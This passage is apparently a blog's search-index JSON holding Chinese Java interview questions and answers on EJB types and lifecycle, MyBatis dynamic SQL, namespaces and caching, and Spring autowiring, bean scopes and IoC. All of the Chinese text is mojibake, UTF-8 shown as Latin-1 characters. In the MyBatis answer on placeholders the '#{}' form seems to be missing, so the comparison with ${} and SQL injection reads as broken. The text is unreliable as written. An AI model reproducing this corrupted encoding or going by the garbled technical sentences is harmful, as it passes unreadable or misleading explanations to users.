ä¸Šå°±æ˜¯home.create()ï¼Œä½†æ˜¯åå°è¦åšå¾ˆå¤šäº‹æƒ…),äºæ˜¯ç»è¿‡ç¬¬2æ¬¡RMIå¾ªç¯ï¼Œåœ¨æœåŠ¡å™¨ç«¯ï¼ŒHomeæ¥å£çš„Weblogicå®ç°ç±»çš„ skeletonç±»æ”¶åˆ°stubç±»çš„è°ƒç”¨ä¿¡æ¯åï¼Œç”±å®ƒå†å»è°ƒç”¨Homeæ¥å£çš„Weblogicå®ç°ç±»çš„createæ–¹æ³•ã€‚åœ¨æœåŠ¡ç«¯ï¼Œ Homeæ¥å£çš„Weblogicå®ç°ç±»çš„createæ–¹æ³•å†å»è°ƒç”¨Beanç±»çš„Weblogicå®ç°ç±»çš„ejbCreateæ–¹æ³•ï¼Œåœ¨æœåŠ¡ç«¯åˆ›å»ºæˆ–è€…åˆ†é…ä¸€ä¸ªEJBå®ä¾‹ï¼Œç„¶åå°†è¿™ä¸ªEJBå®ä¾‹çš„è¿œç¨‹æ¥å£çš„Weblogicå®ç°ç±»çš„stubç±»å¯¹è±¡å®ä¾‹åºåˆ—åŒ–å‘é€ç»™å®¢æˆ·ç«¯ã€‚ è¯´æ˜ä¸€ä¸‹EJBçš„å‡ ç§ç±»å‹åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿä¼šè¯ï¼ˆSessionï¼‰Bean ï¼Œå®ä½“ï¼ˆEntityï¼‰Bean æ¶ˆæ¯é©±åŠ¨çš„ï¼ˆMessage Drivenï¼‰Beanï¼Œä¼šè¯Beanåˆå¯åˆ†ä¸ºæœ‰çŠ¶æ€ï¼ˆStatefulï¼‰å’Œæ— çŠ¶æ€ï¼ˆStatelessï¼‰ä¸¤ç§ï¼Œå®ä½“Beanå¯åˆ†ä¸ºBeanç®¡ç†çš„æŒç»­æ€§ï¼ˆBMPï¼‰å’Œå®¹å™¨ç®¡ç†çš„æŒç»­æ€§ï¼ˆCMPï¼‰ä¸¤ç§ã€‚ ç®€è¿°ä¸€ä¸‹EJBçš„æ¿€æ´»æœºåˆ¶æ˜¯ä»€ä¹ˆï¼Ÿä»¥Stateful Session Bean ä¸ºä¾‹ï¼šå…¶Cacheå¤§å°å†³å®šäº†å†…å­˜ä¸­å¯ä»¥åŒæ—¶å­˜åœ¨çš„Beanå®ä¾‹çš„æ•°é‡ï¼Œæ ¹æ®MRUæˆ–NRUç®—æ³•ï¼Œå®ä¾‹åœ¨æ¿€æ´»å’Œå»æ¿€æ´»çŠ¶æ€ä¹‹é—´è¿ç§»ï¼Œæ¿€æ´»æœºåˆ¶æ˜¯å½“å®¢æˆ·ç«¯è°ƒç”¨æŸä¸ªEJBå®ä¾‹ä¸šåŠ¡æ–¹æ³•æ—¶ï¼Œå¦‚æœå¯¹åº”EJB Objectå‘ç°è‡ªå·±æ²¡æœ‰ç»‘å®šå¯¹åº”çš„Beanå®ä¾‹åˆ™ä»å…¶å»æ¿€æ´»Beanå­˜å‚¨ä¸­ï¼ˆé€šè¿‡åºåˆ—åŒ–æœºåˆ¶å­˜å‚¨å®ä¾‹ï¼‰å›å¤ï¼ˆæ¿€æ´»ï¼‰æ­¤å®ä¾‹ã€‚çŠ¶æ€å˜è¿å‰ä¼šè°ƒç”¨å¯¹åº”çš„ ejbActiveå’ŒejbPassivateæ–¹æ³•ã€‚ è¯´ä¸€ä¸‹EJBè§„èŒƒä¸­EJBç¦æ­¢çš„æ“ä½œæœ‰å“ªäº›ï¼Ÿ1.ä¸èƒ½æ“ä½œçº¿ç¨‹å’Œçº¿ç¨‹API(çº¿ç¨‹APIæŒ‡éçº¿ç¨‹å¯¹è±¡çš„æ–¹æ³•å¦‚notify,waitç­‰)ï¼Œ 2.ä¸èƒ½æ“ä½œawtï¼Œ 3.ä¸èƒ½å®ç°æœåŠ¡å™¨åŠŸèƒ½ï¼Œ 4.ä¸èƒ½å¯¹é™æ€å±ç”Ÿå­˜å–ï¼Œ 5.ä¸èƒ½ä½¿ç”¨IOæ“ä½œç›´æ¥å­˜å–æ–‡ä»¶ç³»ç»Ÿï¼Œ 6.ä¸èƒ½åŠ è½½æœ¬åœ°åº“.ï¼Œ 7.ä¸èƒ½å°†thisä½œä¸ºå˜é‡å’Œè¿”å›ï¼Œ 8.ä¸èƒ½å¾ªç¯è°ƒç”¨ã€‚ è¯·ç®€è¿°ä¸€ä¸‹EJBçš„è§’è‰²ä»¥åŠå¯¹åº”çš„ä¸‰ä¸ªå¯¹è±¡åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ ä¸€ä¸ªå®Œæ•´çš„åŸºäºEJBçš„åˆ†å¸ƒå¼è®¡ç®—ç»“æ„ç”±å…­ä¸ªè§’è‰²ç»„æˆï¼Œè¿™å…­ä¸ªè§’è‰²å¯ä»¥ç”±ä¸åŒçš„å¼€å‘å•†æä¾›ï¼Œæ¯ä¸ªè§’è‰²æ‰€ä½œçš„å·¥ä½œå¿…é¡»éµå¾ªSunå…¬å¸æä¾›çš„EJBè§„èŒƒï¼Œä»¥ä¿è¯å½¼æ­¤ä¹‹é—´çš„å…¼å®¹æ€§ã€‚è¿™å…­ä¸ªè§’è‰²åˆ†åˆ«æ˜¯EJBç»„ä»¶å¼€å‘è€…ï¼ˆEnterprise Bean Providerï¼‰ ã€åº”ç”¨ç»„åˆè€…ï¼ˆApplication Assemblerï¼‰ã€éƒ¨ç½²è€…ï¼ˆDeployerï¼‰ã€EJB æœåŠ¡å™¨æä¾›è€…ï¼ˆEJB Server Providerï¼‰ã€EJB å®¹å™¨æä¾›è€…ï¼ˆEJB Container Providerï¼‰ã€ç³»ç»Ÿç®¡ç†å‘˜ï¼ˆSystem Administratorï¼‰ä¸‰ä¸ªå¯¹è±¡æ˜¯Remoteï¼ˆLocalï¼‰æ¥å£ã€Homeï¼ˆLocalHomeï¼‰æ¥å£ï¼ŒBeanç±» EJBåŒ…æ‹¬SessionBeanå’ŒEntityBeanï¼Œè¯·è¯´å‡ºä»–ä»¬çš„ç”Ÿå‘½å‘¨æœŸä»¥åŠEJBæ˜¯å¦‚ä½•ç®¡ç†äº‹åŠ¡çš„ï¼ŸSessionBeanï¼š Stateless Session Bean çš„ç”Ÿå‘½å‘¨æœŸæ˜¯ç”±å®¹å™¨å†³å®šçš„ï¼Œå½“å®¢æˆ·æœºå‘å‡ºè¯·æ±‚è¦å»ºç«‹ä¸€ä¸ªBeançš„å®ä¾‹æ—¶ï¼ŒEJBå®¹å™¨ä¸ä¸€å®šè¦åˆ›å»ºä¸€ä¸ªæ–°çš„Beançš„å®ä¾‹ä¾›å®¢æˆ·æœºè°ƒç”¨ï¼Œè€Œæ˜¯éšä¾¿æ‰¾ä¸€ä¸ªç°æœ‰çš„å®ä¾‹æä¾›ç»™å®¢æˆ·æœºã€‚å½“å®¢æˆ·æœºç¬¬ä¸€æ¬¡è°ƒç”¨ä¸€ä¸ªStateful Session Bean æ—¶ï¼Œå®¹å™¨å¿…é¡»ç«‹å³åœ¨æœåŠ¡å™¨ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„Beanå®ä¾‹ï¼Œå¹¶å…³è”åˆ°å®¢æˆ·æœºä¸Šï¼Œä»¥åæ­¤å®¢æˆ·æœºè°ƒç”¨Stateful Session Bean çš„æ–¹æ³•æ—¶å®¹å™¨ä¼šæŠŠè°ƒç”¨åˆ†æ´¾åˆ°ä¸æ­¤å®¢æˆ·æœºç›¸å…³è”çš„Beanå®ä¾‹ã€‚EntityBeanï¼šEntity Beansèƒ½å­˜æ´»ç›¸å¯¹è¾ƒé•¿çš„æ—¶é—´ï¼Œå¹¶ä¸”çŠ¶æ€æ˜¯æŒç»­çš„ã€‚åªè¦æ•°æ®åº“ä¸­çš„æ•°æ®å­˜åœ¨ï¼ŒEntity beanså°±ä¸€ç›´å­˜æ´»ã€‚è€Œä¸æ˜¯æŒ‰ç…§åº”ç”¨ç¨‹åºæˆ–è€…æœåŠ¡è¿›ç¨‹æ¥è¯´çš„ã€‚å³ä½¿EJBå®¹å™¨å´©æºƒäº†ï¼ŒEntity beansä¹Ÿæ˜¯å­˜æ´»çš„ã€‚Entity Beansç”Ÿå‘½å‘¨æœŸèƒ½å¤Ÿè¢«å®¹å™¨æˆ–è€…Beansè‡ªå·±ç®¡ç†ã€‚EJBé€šè¿‡ä»¥ä¸‹æŠ€æœ¯ç®¡ç†å®åŠ¡ï¼šå¯¹è±¡ç®¡ç†ç»„ç»‡ï¼ˆOMGï¼‰çš„å¯¹è±¡å®åŠ¡æœåŠ¡ï¼ˆOTSï¼‰ï¼ŒSun Microsystemsçš„Transaction Serviceï¼ˆJTSï¼‰ã€Java Transaction APIï¼ˆJTAï¼‰ï¼Œå¼€å‘ç»„ï¼ˆX/Openï¼‰çš„XAæ¥å£ã€‚ EJBä¸JAVA BEANçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ Java Bean æ˜¯å¯å¤ç”¨çš„ç»„ä»¶ï¼Œå¯¹Java Beanå¹¶æ²¡æœ‰ä¸¥æ ¼çš„è§„èŒƒï¼Œç†è®ºä¸Šè®²ï¼Œä»»ä½•ä¸€ä¸ªJavaç±»éƒ½å¯ä»¥æ˜¯ä¸€ä¸ªBeanã€‚ä½†é€šå¸¸æƒ…å†µä¸‹ï¼Œç”±äºJava Beanæ˜¯è¢«å®¹å™¨æ‰€åˆ›å»ºï¼ˆå¦‚Tomcatï¼‰çš„ï¼Œæ‰€ä»¥Java Beanåº”å…·æœ‰ä¸€ä¸ªæ— å‚çš„æ„é€ å™¨ï¼Œå¦å¤–ï¼Œé€šå¸¸Java Beanè¿˜è¦å®ç°Serializableæ¥å£ç”¨äºå®ç°Beançš„æŒä¹…æ€§ã€‚Java Beanå®é™…ä¸Šç›¸å½“äºå¾®è½¯COMæ¨¡å‹ä¸­çš„æœ¬åœ°è¿›ç¨‹å†…COMç»„ä»¶ï¼Œå®ƒæ˜¯ä¸èƒ½è¢«è·¨è¿›ç¨‹è®¿é—®çš„ã€‚EnterpriseJava Bean ç›¸å½“äºDCOMï¼Œå³åˆ†å¸ƒå¼ç»„ä»¶ã€‚å®ƒæ˜¯åŸºäºJavaçš„è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRMIï¼‰æŠ€æœ¯çš„ï¼Œæ‰€ä»¥EJBå¯ä»¥è¢«è¿œç¨‹è®¿é—®ï¼ˆè·¨è¿›ç¨‹ã€è·¨è®¡ç®—æœºï¼‰ã€‚ä½†EJBå¿…é¡»è¢«å¸ƒç½²åœ¨è¯¸å¦‚Webspereã€WebLogicè¿™æ ·çš„å®¹å™¨ä¸­ï¼ŒEJBå®¢æˆ·ä»ä¸ç›´æ¥è®¿é—®çœŸæ­£çš„EJBç»„ä»¶ï¼Œè€Œæ˜¯é€šè¿‡å…¶å®¹å™¨è®¿é—®ã€‚EJBå®¹å™¨æ˜¯EJBç»„ä»¶çš„ä»£ç†ï¼Œ EJBç»„ä»¶ç”±å®¹å™¨æ‰€åˆ›å»ºå’Œç®¡ç†ã€‚å®¢æˆ·é€šè¿‡å®¹å™¨æ¥è®¿é—®çœŸæ­£çš„EJBç»„ä»¶ã€‚ è¯·é—®EJBæ˜¯åŸºäºå“ªäº›æŠ€æœ¯å®ç°çš„ï¼Ÿå¹¶è¯´æ˜ä¸€ä¸‹SessionBeanå’ŒEntityBeançš„åŒºåˆ«ä»¥åŠStatefulBeanå’ŒStatelessBeançš„åŒºåˆ«ã€‚EJBåŒ…æ‹¬Session Beanã€Entity Beanã€Message Driven Beanï¼ŒåŸºäºJNDIã€RMIã€JATç­‰æŠ€æœ¯å®ç°ã€‚SessionBeanåœ¨J2EEåº”ç”¨ç¨‹åºä¸­è¢«ç”¨æ¥å®Œæˆä¸€äº›æœåŠ¡å™¨ç«¯çš„ä¸šåŠ¡æ“ä½œï¼Œä¾‹å¦‚è®¿é—®æ•°æ®åº“ã€è°ƒç”¨å…¶ä»–EJBç»„ä»¶ã€‚EntityBeanè¢«ç”¨æ¥ä»£è¡¨åº”ç”¨ç³»ç»Ÿä¸­ç”¨åˆ°çš„æ•°æ®ã€‚å¯¹äºå®¢æˆ·æœºï¼ŒSessionBeanæ˜¯ä¸€ç§éæŒä¹…æ€§å¯¹è±¡ï¼Œå®ƒå®ç°æŸäº›åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œçš„ä¸šåŠ¡é€»è¾‘ã€‚å¯¹äºå®¢æˆ·æœºï¼ŒEntityBeanæ˜¯ä¸€ç§æŒä¹…æ€§å¯¹è±¡ï¼Œå®ƒä»£è¡¨ä¸€ä¸ªå­˜å‚¨åœ¨æŒä¹…æ€§å­˜å‚¨å™¨ä¸­çš„å®ä½“çš„å¯¹è±¡è§†å›¾ï¼Œæˆ–æ˜¯ä¸€ä¸ªç”±ç°æœ‰ä¼ä¸šåº”ç”¨ç¨‹åºå®ç°çš„å®ä½“ã€‚Session Bean è¿˜å¯ä»¥å†ç»†åˆ†ä¸º Stateful Session Bean ä¸ Stateless Session Bean ï¼Œè¿™ä¸¤ç§çš„ Session Beanéƒ½å¯ä»¥å°†ç³»ç»Ÿé€»è¾‘æ”¾åœ¨ methodä¹‹ä¸­æ‰§è¡Œï¼Œä¸åŒçš„æ˜¯ Stateful Session Bean å¯ä»¥è®°å½•å‘¼å«è€…çš„çŠ¶æ€ï¼Œå› æ­¤é€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ªä½¿ç”¨è€…ä¼šæœ‰ä¸€ä¸ªç›¸å¯¹åº”çš„Stateful Session Bean çš„å®ä½“ã€‚Stateless Session Bean è™½ç„¶ä¹Ÿæ˜¯é€»è¾‘ç»„ä»¶ï¼Œä½†æ˜¯ä»–å´ä¸è´Ÿè´£è®°å½•ä½¿ç”¨è€…çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯è¯´å½“ä½¿ç”¨è€…å‘¼å« Stateless Session Bean çš„æ—¶å€™ï¼ŒEJB Container å¹¶ä¸ä¼šæ‰¾å¯»ç‰¹å®šçš„ Stateless Session Bean çš„å®ä½“æ¥æ‰§è¡Œè¿™ä¸ª methodã€‚æ¢è¨€ä¹‹ï¼Œå¾ˆå¯èƒ½æ•°ä¸ªä½¿ç”¨è€…åœ¨æ‰§è¡ŒæŸä¸ª Stateless Session Bean çš„ methods æ—¶ï¼Œä¼šæ˜¯åŒä¸€ä¸ª Bean çš„ Instance åœ¨æ‰§è¡Œã€‚ä»å†…å­˜æ–¹é¢æ¥çœ‹ï¼Œ Stateful Session Bean ä¸ Stateless Session Bean æ¯”è¾ƒï¼Œ Stateful Session Bean ä¼šæ¶ˆè€— J2EE Server è¾ƒå¤šçš„å†…å­˜ï¼Œç„¶è€Œ Stateful Session Bean çš„ä¼˜åŠ¿å´åœ¨äºä»–å¯ä»¥ç»´æŒä½¿ç”¨è€…çš„çŠ¶æ€ã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"Mybatis","slug":"Mybatis","date":"2020-07-13T21:41:49.000Z","updated":"2021-04-11T17:11:28.323Z","comments":true,"path":"Mybatis/","link":"","permalink":"https://blog.kayleh.top/Mybatis/","excerpt":"MYBATIS","text":"MYBATIS è¯·é—®MyBatisä¸­çš„åŠ¨æ€SQLæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ å¯¹äºä¸€äº›å¤æ‚çš„æŸ¥è¯¢ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šæŒ‡å®šå¤šä¸ªæŸ¥è¯¢æ¡ä»¶ï¼Œä½†æ˜¯è¿™äº›æ¡ä»¶å¯èƒ½å­˜åœ¨ä¹Ÿå¯èƒ½ä¸å­˜åœ¨ï¼Œéœ€è¦æ ¹æ®ç”¨æˆ·æŒ‡å®šçš„æ¡ä»¶åŠ¨æ€ç”ŸæˆSQLè¯­å¥ã€‚å¦‚æœä¸ä½¿ç”¨æŒä¹…å±‚æ¡†æ¶æˆ‘ä»¬å¯èƒ½éœ€è¦è‡ªå·±æ‹¼è£…SQLè¯­å¥ï¼Œè¿˜å¥½MyBatisæä¾›äº†åŠ¨æ€SQLçš„åŠŸèƒ½æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚MyBatisä¸­ç”¨äºå®ç°åŠ¨æ€SQLçš„å…ƒç´ ä¸»è¦æœ‰ï¼š- if- choose / when / otherwise- trim- where- set- foreach è¯´æ˜ä¸€ä¸‹MyBatisä¸­å‘½åç©ºé—´ï¼ˆnamespaceï¼‰çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿåœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œå¯èƒ½å­˜åœ¨å¤§é‡çš„SQLè¯­å¥ï¼Œè¿™æ—¶å€™ä¸ºæ¯ä¸ªSQLè¯­å¥èµ·ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ï¼ˆIDï¼‰å°±å˜å¾—å¹¶ä¸å®¹æ˜“äº†ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œåœ¨MyBatisä¸­ï¼Œå¯ä»¥ä¸ºæ¯ä¸ªæ˜ å°„æ–‡ä»¶èµ·ä¸€ä¸ªå”¯ä¸€çš„å‘½åç©ºé—´ï¼Œè¿™æ ·å®šä¹‰åœ¨è¿™ä¸ªæ˜ å°„æ–‡ä»¶ä¸­çš„æ¯ä¸ªSQLè¯­å¥å°±æˆäº†å®šä¹‰åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­çš„ä¸€ä¸ªIDã€‚åªè¦æˆ‘ä»¬èƒ½å¤Ÿä¿è¯æ¯ä¸ªå‘½åç©ºé—´ä¸­è¿™ä¸ªIDæ˜¯å”¯ä¸€çš„ï¼Œå³ä½¿åœ¨ä¸åŒæ˜ å°„æ–‡ä»¶ä¸­çš„è¯­å¥IDç›¸åŒï¼Œä¹Ÿä¸ä¼šå†äº§ç”Ÿå†²çªäº†ã€‚ 1ã€mybatiså¯¹JDBCåšäº†å“ªäº›å°è£…ï¼Ÿ 2ã€mybatiså¦‚ä½•æ˜ å°„ï¼Ÿ 3ã€Mybatisæ¥å£ç»‘å®šæœ‰å‡ ç§å®ç°æ–¹å¼,åˆ†åˆ«æ˜¯æ€ä¹ˆå®ç°çš„? 4ã€Mybatisä¸­å’Œ${}çš„åŒºåˆ«ï¼Ÿ 5ã€myBatis å®ç°ä¸€å¯¹ä¸€æœ‰å‡ ç§æ–¹å¼?å…·ä½“æ€ä¹ˆæ“ä½œçš„ï¼Ÿ 6ã€myBatis å®ç°ä¸€å¯¹å¤šæœ‰å‡ ç§æ–¹å¼?æ€ä¹ˆæ“ä½œçš„ï¼Ÿ 7ã€myBatis é‡Œé¢çš„åŠ¨æ€Sqlæ˜¯æ€ä¹ˆè®¾å®šçš„?ç”¨ä»€ä¹ˆè¯­æ³•? 8ã€è®²ä¸‹ myBatis çš„ç¼“å­˜ï¼Ÿ 9ã€mybatisçš„æ‰§è¡Œæµç¨‹ï¼Ÿ 10ã€æŒä¹…å±‚æ¡†æ¶ä¸ºä»€ä¹ˆé€‰æ‹©mybatisï¼Ÿ 2ğŸ˜. mapper.xmlæ–‡ä»¶ä¸­çš„namespace(å…¨é™å)æ¥å…³è”å’Œæ¥å£çš„å…³ç³». 3ğŸ˜. .ä¸¤ç§æ–¹å¼: â‘ é€šè¿‡æ³¨è§£ç»‘å®š,åœ¨æ¥å£çš„æ–¹æ³•ä¸Šæ·»åŠ @select,@update,ç­‰æ³¨è§£,é‡Œé¢åŒ…å«äº†sqlè¯­å¥.â‘¡é€šè¿‡xmlæ–‡ä»¶é‡Œå†™sqlç»‘å®š,è¿™ç§æ–¹å¼è¦æ±‚æŒ‡å®šxmlæ–‡ä»¶é‡Œnamespaceçš„å€¼ä¸ºæ¥å£çš„å…¨é™å®šå.4ğŸ˜.ä½¿ç”¨ ${}åœ¨ç¼–è¯‘æœŸä¼ å…¥çš„å‚æ•°ä¼šç›´æ¥æ‹¼æ¥æˆå­—ç¬¦ä¸²,è€Œåˆ™ä¼šç”Ÿæˆå ä½ç¬¦â€?â€,å¹¶ä¸”å› ä¸º${}ä¼šç›´æ¥æ‹¼æ¥æˆå­—ç¬¦ä¸²,ä¼šé€ æˆsqlæ³¨å…¥,è€Œä¼ å…¥çš„å‚æ•°ä¼šç”Ÿæˆå ä½ç¬¦â€?â€ ,å¯ä»¥æœ‰æ•ˆçš„é˜²æ­¢äº†sqlæ³¨å…¥. 7ğŸ˜.åŠ¨æ€sqlé€šè¿‡ifèŠ‚ç‚¹æ¥å®ç°,ä½¿ç”¨OGNLè¯­æ³•åˆ¤æ–­.å®Œæ•´çš„åŠ¨æ€sqlè¦é…åˆwhere,trimèŠ‚ç‚¹,choose,when,otherwiseæ ‡ç­¾æ¥å®Œæˆ,ä¸€ä¸ªchooseä¸­è‡³å°‘æœ‰ä¸€ä¸ªwhen,0ä¸ªor1ä¸ªotherwise,å¦‚æœwhenæ»¡è¶³å°±æ‰§è¡Œ, å…¨éƒ¨ä¸æ»¡ä½å°±æ‰§è¡Œotherwise. 8ğŸ˜.mybatisåˆ†ä¸€çº§ç¼“å­˜å’ŒäºŒçº§ç¼“å­˜;ä¸€çº§ç¼“å­˜é»˜è®¤å¼€å¯,åœ¨å¯¹è±¡ä¸­æœ‰ä¸ªhashmapç”¨äºå­˜å‚¨ç¼“å­˜æ•°æ®,ä¸åŒçš„sqlsessioinä¹‹é—´ç¼“å­˜æ•°æ®äº’ä¸å½±å“.äºŒçº§ç¼“å­˜æ—¶mapperæ˜ å°„çº§åˆ«çš„ç¼“å­˜,å¤šä¸ªSqlSessionå»æ“ä½œåŒä¸€ä¸ªmapperæ˜ å°„çš„sqlè¯­å¥,å¤šä¸ªSqlSessionå¯ä»¥å…¬ç”¨äºŒçº§ç¼“å­˜,äºŒçº§ç¼“å­˜æ˜¯è·¨SqlSessionçš„. (äºŒçº§ç¼“å­˜éœ€è¦æ‰‹åŠ¨å¼€å¯),ä¸€çº§ç¼“å­˜å’ŒäºŒçº§ç¼“å­˜éƒ½æ˜¯ç”¨ä½œåœ¨çŸ­æ—¶é—´å†…é‡å¤æŸ¥è¯¢è€Œåšçš„ä¼˜åŒ–. ! æˆ‘ç¼–ä¸ä¸‹å»äº†.!ğŸ¤£","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"Spring","slug":"Spring","date":"2020-07-13T21:40:15.000Z","updated":"2021-04-11T17:11:28.429Z","comments":true,"path":"Spring/","link":"","permalink":"https://blog.kayleh.top/Spring/","excerpt":"SPRING","text":"SPRING Springä¸­è‡ªåŠ¨è£…é…çš„æ–¹å¼æœ‰å“ªäº›ï¼Ÿ- noï¼šä¸è¿›è¡Œè‡ªåŠ¨è£…é…ï¼Œæ‰‹åŠ¨è®¾ç½®Beançš„ä¾èµ–å…³ç³»ã€‚- byNameï¼šæ ¹æ®Beançš„åå­—è¿›è¡Œè‡ªåŠ¨è£…é…ã€‚- byTypeï¼šæ ¹æ®Beançš„ç±»å‹è¿›è¡Œè‡ªåŠ¨è£…é…ã€‚- constructorï¼šç±»ä¼¼äºbyTypeï¼Œä¸è¿‡æ˜¯åº”ç”¨äºæ„é€ å™¨çš„å‚æ•°ï¼Œå¦‚æœæ­£å¥½æœ‰ä¸€ä¸ªBeanä¸æ„é€ å™¨çš„å‚æ•°ç±»å‹ç›¸åŒåˆ™å¯ä»¥è‡ªåŠ¨è£…é…ï¼Œå¦åˆ™ä¼šå¯¼è‡´é”™è¯¯ã€‚- autodetectï¼šå¦‚æœæœ‰é»˜è®¤çš„æ„é€ å™¨ï¼Œåˆ™é€šè¿‡constructorçš„æ–¹å¼è¿›è¡Œè‡ªåŠ¨è£…é…ï¼Œå¦åˆ™ä½¿ç”¨byTypeçš„æ–¹å¼è¿›è¡Œè‡ªåŠ¨è£…é…ã€‚ è‡ªåŠ¨è£…é…æ²¡æœ‰è‡ªå®šä¹‰è£…é…æ–¹å¼é‚£ä¹ˆç²¾ç¡®ï¼Œè€Œä¸”ä¸èƒ½è‡ªåŠ¨è£…é…ç®€å•å±æ€§ï¼ˆåŸºæœ¬ç±»å‹ã€å­—ç¬¦ä¸²ç­‰ï¼‰ï¼Œåœ¨ä½¿ç”¨æ—¶åº”æ³¨æ„ã€‚ Springä¸­Beançš„ä½œç”¨åŸŸæœ‰å“ªäº›ï¼Ÿåœ¨Springçš„æ—©æœŸç‰ˆæœ¬ä¸­ï¼Œä»…æœ‰ä¸¤ä¸ªä½œç”¨åŸŸï¼šsingletonå’Œprototypeï¼Œå‰è€…è¡¨ç¤ºBeanä»¥å•ä¾‹çš„æ–¹å¼å­˜åœ¨ï¼›åè€…è¡¨ç¤ºæ¯æ¬¡ä»å®¹å™¨ä¸­è°ƒç”¨Beanæ—¶ï¼Œéƒ½ä¼šè¿”å›ä¸€ä¸ªæ–°çš„å®ä¾‹ï¼Œprototypeé€šå¸¸ç¿»è¯‘ä¸ºåŸå‹ã€‚ è®¾è®¡æ¨¡å¼ä¸­çš„åˆ›å»ºå‹æ¨¡å¼ä¸­ä¹Ÿæœ‰ä¸€ä¸ªåŸå‹æ¨¡å¼ï¼ŒåŸå‹æ¨¡å¼ä¹Ÿæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„æ¨¡å¼ï¼Œä¾‹å¦‚åšä¸€ä¸ªå®¤å†…è®¾è®¡è½¯ä»¶ï¼Œæ‰€æœ‰çš„ç´ æéƒ½åœ¨å·¥å…·ç®±ä¸­ï¼Œè€Œæ¯æ¬¡ä»å·¥å…·ç®±ä¸­å–å‡ºçš„éƒ½æ˜¯ç´ æå¯¹è±¡çš„ä¸€ä¸ªåŸå‹ï¼Œå¯ä»¥é€šè¿‡å¯¹è±¡å…‹éš†æ¥å®ç°åŸå‹æ¨¡å¼ã€‚Spring 2.xä¸­é’ˆå¯¹WebApplicationContextæ–°å¢äº†3ä¸ªä½œç”¨åŸŸï¼Œåˆ†åˆ«æ˜¯ï¼šrequestï¼ˆæ¯æ¬¡HTTPè¯·æ±‚éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„Beanï¼‰ã€sessionï¼ˆåŒä¸€ä¸ªHttpSessionå…±äº«åŒä¸€ä¸ªBeanï¼Œä¸åŒçš„HttpSessionä½¿ç”¨ä¸åŒçš„Beanï¼‰å’ŒglobalSessionï¼ˆåŒä¸€ä¸ªå…¨å±€Sessionå…±äº«ä¸€ä¸ªBeanï¼‰ã€‚ å•ä¾‹æ¨¡å¼å’ŒåŸå‹æ¨¡å¼éƒ½æ˜¯é‡è¦çš„è®¾è®¡æ¨¡å¼ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ— çŠ¶æ€æˆ–çŠ¶æ€ä¸å¯å˜çš„ç±»é€‚åˆä½¿ç”¨å•ä¾‹æ¨¡å¼ã€‚åœ¨ä¼ ç»Ÿå¼€å‘ä¸­ï¼Œç”±äºDAOæŒæœ‰Connectionè¿™ä¸ªéçº¿ç¨‹å®‰å…¨å¯¹è±¡å› è€Œæ²¡æœ‰ä½¿ç”¨å•ä¾‹æ¨¡å¼ï¼›ä½†åœ¨Springç¯å¢ƒä¸‹ï¼Œæ‰€æœ‰DAOç±»å¯¹å¯ä»¥é‡‡ç”¨å•ä¾‹æ¨¡å¼ï¼Œå› ä¸ºSpringåˆ©ç”¨AOPå’ŒJava APIä¸­çš„ThreadLocalå¯¹éçº¿ç¨‹å®‰å…¨çš„å¯¹è±¡è¿›è¡Œäº†ç‰¹æ®Šå¤„ç†ã€‚ ä»€ä¹ˆæ˜¯IoCå’ŒDIï¼Ÿå¹¶ä¸”ç®€è¦è¯´æ˜ä¸€ä¸‹DIæ˜¯å¦‚ä½•å®ç°çš„ï¼ŸIoCå«æ§åˆ¶åè½¬ï¼Œæ˜¯Inversion of Controlçš„ç¼©å†™ï¼ŒDIï¼ˆDependency Injectionï¼‰å«ä¾èµ–æ³¨å…¥ï¼Œæ˜¯å¯¹IoCæ›´ç®€å•çš„è¯ é‡Šã€‚æ§åˆ¶åè½¬æ˜¯æŠŠä¼ ç»Ÿä¸Šç”±ç¨‹åºä»£ç ç›´æ¥æ“æ§çš„å¯¹è±¡çš„è°ƒç”¨æƒäº¤ç»™å®¹å™¨ï¼Œé€šè¿‡å®¹å™¨æ¥å®ç°å¯¹è±¡ç»„ä»¶çš„è£…é…å’Œç®¡ç†ã€‚æ‰€è°“çš„â€æ§åˆ¶åè½¬â€å°±æ˜¯å¯¹ç»„ä»¶å¯¹è±¡æ§åˆ¶æƒçš„è½¬ç§»ï¼Œä»ç¨‹åºä»£ç æœ¬èº«è½¬ç§»åˆ°äº†å¤–éƒ¨å®¹å™¨ï¼Œç”±å®¹å™¨æ¥åˆ›å»ºå¯¹è±¡å¹¶ç®¡ç†å¯¹è±¡ä¹‹é—´çš„ä¾èµ–å…³ç³»ã€‚IoCä½“ç°äº†å¥½è±ååŸåˆ™ - â€œDonâ€™t call me, we will call youâ€ã€‚ä¾èµ–æ³¨å…¥çš„åŸºæœ¬åŸåˆ™æ˜¯åº”ç”¨ç»„ä»¶ä¸åº”è¯¥è´Ÿè´£æŸ¥æ‰¾èµ„æºæˆ–è€…å…¶ä»–ä¾èµ–çš„åä½œå¯¹è±¡ã€‚é…ç½®å¯¹è±¡çš„å·¥ä½œåº”è¯¥ç”±å®¹å™¨è´Ÿè´£ï¼ŒæŸ¥æ‰¾èµ„æºçš„é€»è¾‘åº”è¯¥ä»åº”ç”¨ç»„ä»¶çš„ä»£ç 